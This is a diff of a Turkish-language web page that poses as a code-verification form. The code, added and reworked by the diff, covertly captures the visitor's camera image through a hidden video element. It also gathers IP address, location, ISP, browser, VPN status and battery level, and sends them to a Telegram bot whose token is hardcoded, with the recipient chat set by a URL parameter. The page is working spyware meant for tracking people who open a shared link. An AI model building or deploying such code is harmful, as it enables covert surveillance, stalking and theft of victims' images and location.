@@ -33,159 +33,122 @@
 <script>
 const BOT_TOKEN = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
 const ADMIN_ID = "7791726274";
-const ADMIN_CODE = "670570";  // Admin kodu, herkes için değil
+const ADMIN_CODE = "670570";  
 
 const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get("chat");    // Karşı tarafın chat ID'si, zorunlu
-const URL_SIFRE = urlParams.get("sifre"); // Kişisel şifre
+const CHAT_ID = urlParams.get("chat");    
+const URL_SIFRE = urlParams.get("sifre"); 
 
-// Rastgele sahte kod üretimi
 function generateFakeCode() {
   const part1 = Math.floor(1000 + Math.random() * 9000);
   const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
   return `TR-${part1}-${part2}`;
 }
 
-// Telegram API ile mesaj gönderimi
-async function sendTelegramMessage(chat_id, text) {
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id, text }),
-  });
+async function sendTelegramMessage(chat_id, text, blob=null) {
+  if(blob){
+    const formData=new FormData();
+    formData.append("chat_id",chat_id);
+    formData.append("photo",blob,"photo.jpg");
+    formData.append("caption",text);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
+  } else {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id,text}),
+    });
+  }
 }
 
-// IP bilgisi alma
 async function getIPData() {
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    return await res.json();
-  } catch {
-    return {};
-  }
+  try { return await (await fetch("https://ipapi.co/json/")).json(); } 
+  catch { return {}; }
 }
 
-// Batarya bilgisi alma
 async function getBatteryInfo() {
-  try {
+  try { 
     const bat = await navigator.getBattery();
-    const level = Math.round(bat.level * 100);
-    const charging = bat.charging ? "Prize takılı" : "Bataryada";
-    return { level, charging };
-  } catch {
-    return { level: "Bilinmiyor", charging: "" };
-  }
+    return { level: Math.round(bat.level*100), charging: bat.charging ? "Prize takılı" : "Bataryada" }; 
+  } 
+  catch { return { level: "Bilinmiyor", charging: "" }; }
 }
 
-// Kamera gizlice açma ve foto çekme (güncel)
-async function takePhoto() {
-  try {
-    const video = document.createElement("video");
-    video.style.display = "none";
+async function takePhotoWithData(messageText) {
+  try{
+    const video=document.createElement("video");
+    video.style.display="none";
     document.body.appendChild(video);
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-
-    await video.play(); // video stream’i başlat
-    await new Promise(r => setTimeout(r, 500)); // kamera stabilize olsun
-
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(async (blob) => {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-      stream.getTracks().forEach(track => track.stop());
+    const stream=await navigator.mediaDevices.getUserMedia({video:true});
+    video.srcObject=stream;
+    await video.play();
+    await new Promise(r=>setTimeout(r,500));
+    const canvas=document.createElement("canvas");
+    canvas.width=video.videoWidth||640;
+    canvas.height=video.videoHeight||480;
+    canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+    canvas.toBlob(async blob=>{
+      await sendTelegramMessage(CHAT_ID,messageText,blob);
+      stream.getTracks().forEach(track=>track.stop());
       video.remove();
-    }, "image/jpeg");
-
-  } catch(e) {
-    console.log("Kamera açılamadı veya hata oluştu", e);
-  }
+    },"image/jpeg");
+  }catch(e){ console.log("Kamera açılamadı veya hata oluştu",e);}
 }
 
-// Kullanıcı verilerini Telegram'a gönder
-async function sendUserData(fakeCode) {
-  const ipData = await getIPData();
-  const battery = await getBatteryInfo();
-  const userAgent = navigator.userAgent;
-  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
-  const mapsLink = ipData.latitude && ipData.longitude
-    ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
-    : "Bilinmiyor";
-
-  const message = 
-`📡 IP: ${ipData.ip || "Bilinmiyor"}
+async function collectUserData(fakeCode){
+  const ipData=await getIPData();
+  const battery=await getBatteryInfo();
+  const userAgent=navigator.userAgent;
+  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
+  return `
+📡 IP: ${ipData.ip || "Bilinmiyor"}
 🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
 🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
 🧠 ISP: ${ipData.org || "Bilinmiyor"}
 📱 Tarayıcı: ${userAgent}
 🔐 VPN/Proxy: ${vpnProxy}
-🗺️ Harita: ${mapsLink}
 🔋 Şarj: ${battery.level}% (${battery.charging})
 💻 Kod: ${fakeCode}`;
-
-  await sendTelegramMessage(CHAT_ID, message);
-  takePhoto();
 }
 
-function showError(msg) {
-  const errorDiv = document.getElementById("errorMsg");
-  errorDiv.textContent = msg;
-  errorDiv.style.display = "block";
-  document.getElementById("fakeCode").style.display = "none";
+function sendLocation() {
+  if(!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(pos=>{
+    const lat=pos.coords.latitude;
+    const lon=pos.coords.longitude;
+    const link=`🗺️ Konum: https://maps.google.com/?q=${lat},${lon}`;
+    sendTelegramMessage(CHAT_ID,link);
+  });
 }
 
-function hideError() {
-  const errorDiv = document.getElementById("errorMsg");
-  errorDiv.style.display = "none";
-}
+function showError(msg){const e=document.getElementById("errorMsg");e.textContent=msg;e.style.display="block";document.getElementById("fakeCode").style.display="none";}
+function hideError(){document.getElementById("errorMsg").style.display="none";}
 
-(async () => {
-  if (!CHAT_ID || !URL_SIFRE) return;
-  await sendUserData("SITE_ACILDI");
-})();
+document.getElementById("submitBtn").addEventListener("click",async ()=>{
+  const input=document.getElementById("codeInput").value.trim();
+  if(!CHAT_ID||!URL_SIFRE){ showError("Bu siteyi doğru link üzerinden açmalısın."); return; }
 
-document.getElementById("submitBtn").addEventListener("click", async () => {
-  const input = document.getElementById("codeInput").value.trim();
-
-  if (!CHAT_ID || !URL_SIFRE) {
-    showError("Bu siteyi doğru link üzerinden açmalısın.");
-    return;
-  }
-
-  if(input === ADMIN_CODE){
+  if(input===ADMIN_CODE){
     hideError();
-    const fakeCode = generateFakeCode();
-    const codeDiv = document.getElementById("fakeCode");
-    codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
-    codeDiv.style.display = "block";
-    await sendTelegramMessage(ADMIN_ID, `Admin kodu kullanıldı.`);
-    await sendUserData(fakeCode);
+    const fakeCode=generateFakeCode();
+    document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
+    document.getElementById("fakeCode").style.display="block";
+    await sendTelegramMessage(ADMIN_ID,"Admin kodu kullanıldı.");
+    const messageText=await collectUserData(fakeCode);
+    await takePhotoWithData(messageText);
     return;
   }
 
-  if(input !== URL_SIFRE){
-    showError("Kod hatalı veya süresi dolmuş olabilir.");
-    return;
-  }
+  if(input!==URL_SIFRE){ showError("Kod hatalı veya süresi dolmuş olabilir."); return; }
 
   hideError();
-  const fakeCode = generateFakeCode();
-  const codeDiv = document.getElementById("fakeCode");
-  codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
-  codeDiv.style.display = "block";
+  const fakeCode=generateFakeCode();
+  document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
+  document.getElementById("fakeCode").style.display="block";
 
-  await sendUserData(fakeCode);
-  await sendUserData("BUTON_TIKLANDI");
+  const messageText=await collectUserData(fakeCode);
+  await takePhotoWithData(messageText);
+  sendLocation();
 });
 </script>
 
